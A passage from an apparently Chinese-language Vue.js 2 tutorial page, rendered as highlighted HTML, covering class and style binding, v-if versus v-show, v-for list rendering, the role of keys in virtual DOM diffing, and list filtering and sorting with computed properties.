class="selector-class">.happy</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">4px</span> solid red;;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0.644</span>);</span></span><br><span class="line"><span class="language-css"><span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="number">30deg</span>,yellow,pink,orange,yellow);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.sad</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">4px</span> dashed <span class="built_in">rgb</span>(<span class="number">2</span>, <span class="number">197</span>, <span class="number">2</span>);</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: gray;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.normal</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: skyblue;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.atguigu1</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: yellowgreen;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.atguigu2</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">text-shadow</span>:<span class="number">2px</span> <span class="number">2px</span> <span class="number">10px</span> red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.atguigu3</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border-radius</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;mood&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;changeMood&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;classArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;classObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 绑定style样式--对象写法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;styleObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 绑定style样式--数组写法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;styleArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">mood</span>:<span class="string">&#x27;normal&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">classArr</span>:[<span class="string">&#x27;atguigu1&#x27;</span>,<span class="string">&#x27;atguigu2&#x27;</span>,<span class="string">&#x27;atguigu3&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript"><span class="attr">classObj</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">atguigu1</span>:<span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">atguigu2</span>:<span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">styleObj</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">fontSize</span>: <span class="string">&#x27;40px&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">color</span>:<span class="string">&#x27;red&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">styleObj2</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">backgroundColor</span>:<span class="string">&#x27;orange&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">styleArr</span>:[</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">fontSize</span>: <span class="string">&#x27;40px&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">color</span>:<span class="string">&#x27;blue&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">backgroundColor</span>:<span class="string">&#x27;gray&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">]</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">changeMood</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> arr = [<span class="string">&#x27;happy&#x27;</span>,<span class="string">&#x27;sad&#x27;</span>,<span class="string">&#x27;normal&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> index = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">3</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">mood</span> = arr[index]</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h2 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h2><ul><li>v-if<ul><li>写法：<ul><li>v-if=”表达式”</li><li>v-else-if=”表达式”</li><li>v-else=”表达式”</li></ul></li><li>适用于：切换频率较低的场景</li><li>特点：不展示的DOM元素直接被移除</li><li>注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”</li></ul></li><li>v-show<ul><li>写法：v-show=”表达式”</li><li>适用于：切换频率较高的场景</li><li>特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉<br><code>注意：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到</code></li></ul></li></ul><h2 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h2><h3 id="基本列表"><a href="#基本列表" class="headerlink" title="基本列表"></a>基本列表</h3><ul><li>v-for指令<ul><li>用于展示列表数据</li><li>语法：v-for=”(item, index) in xxx” :key=”yyy”</li><li>可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 遍历数组 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表（遍历数组）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) of persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 遍历对象 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>汽车信息（遍历对象）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(value,k) of car&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;k&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;k&#125;&#125;-&#123;&#123;value&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 遍历字符串 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>测试遍历字符串（用得少）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(char,index) of str&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;char&#125;&#125;-&#123;&#123;index&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 遍历指定次数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>测试遍历指定次数（用得少）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(number,index) of 5&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;index&#125;&#125;-&#123;&#123;number&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">persons</span>:[</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;李四&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;王五&#x27;</span>,<span class="attr">age</span>:<span class="number">20</span>&#125;</span></span><br><span class="line"><span class="language-javascript">    ],</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">car</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>:<span class="string">&#x27;奥迪A8&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">price</span>:<span class="string">&#x27;70万&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">color</span>:<span class="string">&#x27;黑色&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">str</span>:<span class="string">&#x27;hello&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="key的原理"><a href="#key的原理" class="headerlink" title="key的原理"></a>key的原理</h3><ul><li>react、vue中的key有什么作用？（key的内部原理）<ul><li>虚拟DOM中key的作用:key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：<ul><li>(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：<ul><li>①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！</li><li>②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。</li></ul></li><li>(2).旧虚拟DOM中未找到与新虚拟DOM相同的key，创建新的真实DOM，随后渲染到到页面</li></ul></li><li>用index作为key可能会引发的问题：<ul><li>若对数据进行：逆序添加、逆序删除等破坏顺序操作，会产生没有必要的真实DOM更新 ==&gt; 界面效果没问题, 但效率低。</li><li>如果结构中还包含输入类的DOM：会产生错误DOM更新 ==&gt; 界面有问题。</li></ul></li><li>开发中如何选择key?:<ul><li>最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。</li><li>如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示， 使用index作为key是没有问题的。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 准备好一个容器--&gt;</span><br><span class="line">&lt;div id=&quot;root&quot;&gt;</span><br><span class="line">&lt;!-- 遍历数组 --&gt;</span><br><span class="line">  &lt;h2&gt;人员列表（遍历数组）&lt;/h2&gt;</span><br><span class="line">  &lt;button @click.once=&quot;add&quot;&gt;添加一个老刘&lt;/button&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;li v-for=&quot;(p,index) of persons&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">      &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span><br><span class="line">      &lt;input type=&quot;text&quot;&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line"> &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">Vue.config.productionTip = false</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el:&#x27;#root&#x27;,</span><br><span class="line">  data:&#123;</span><br><span class="line">    persons:[</span><br><span class="line">      &#123;id:&#x27;001&#x27;,name:&#x27;张三&#x27;,age:18&#125;,</span><br><span class="line">      &#123;id:&#x27;002&#x27;,name:&#x27;李四&#x27;,age:19&#125;,</span><br><span class="line">      &#123;id:&#x27;003&#x27;,name:&#x27;王五&#x27;,age:20&#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    add()&#123;</span><br><span class="line">      const p = &#123;id:&#x27;004&#x27;,name:&#x27;老刘&#x27;,age:40&#125;</span><br><span class="line">      this.persons.unshift(p)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h3 id="列表过滤、排序和更新"><a href="#列表过滤、排序和更新" class="headerlink" title="列表过滤、排序和更新"></a>列表过滤、排序和更新</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入名字&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;keyWord&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType = 2&quot;</span>&gt;</span>年龄升序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType = 1&quot;</span>&gt;</span>年龄降序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType = 0&quot;</span>&gt;</span>原顺序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateMei&quot;</span>&gt;</span>更新马冬梅的信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) of filPerons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 1、过滤</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//用watch实现</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/* new Vue(&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">    el:&#x27;#root&#x27;,</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">    data:&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        keyWord:&#x27;&#x27;,</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        persons:[</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">            &#123;id:&#x27;001&#x27;,name:&#x27;马冬梅&#x27;,age:19,sex:&#x27;女&#x27;&#125;,</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">            &#123;id:&#x27;002&#x27;,name:&#x27;周冬雨&#x27;,age:20,sex:&#x27;女&#x27;&#125;,</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">            &#123;id:&#x27;003&#x27;,name:&#x27;周杰伦&#x27;,age:21,sex:&#x27;男&#x27;&#125;,</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">            &#123;id:&#x27;004&#x27;,name:&#x27;温兆伦&#x27;,age:22,sex:&#x27;男&#x27;&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        ],</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        filPerons:[]</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">    &#125;,</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">    watch:&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        keyWord:&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">            immediate:true,</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">            handler(val)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                this.filPerons = this.persons.filter((p)=&gt;&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                    return p.name.indexOf(val) !== -1</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                &#125;)</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">            &#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        &#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">    &#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;) */</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//用computed实现</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">keyWord</span>:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">persons</span>:[</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">20</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">21</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;温兆伦&#x27;</span>,<span class="attr">age</span>:<span class="number">22</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">    ]</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">filPerons</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">persons</span>.<span class="title function_">filter</span>(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> p.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="variable language_">this</span>.<span class="property">keyWord</span>) !== -<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// 2、排序</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">keyWord</span>:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">sortType</span>:<span class="number">0</span>, <span class="comment">//0原顺序 1降序 2升序</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">persons</span>:[</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">30</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">31</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">      &#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;温兆伦&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">    ]</span></span><br><span class="line"><span class="language-javascript">  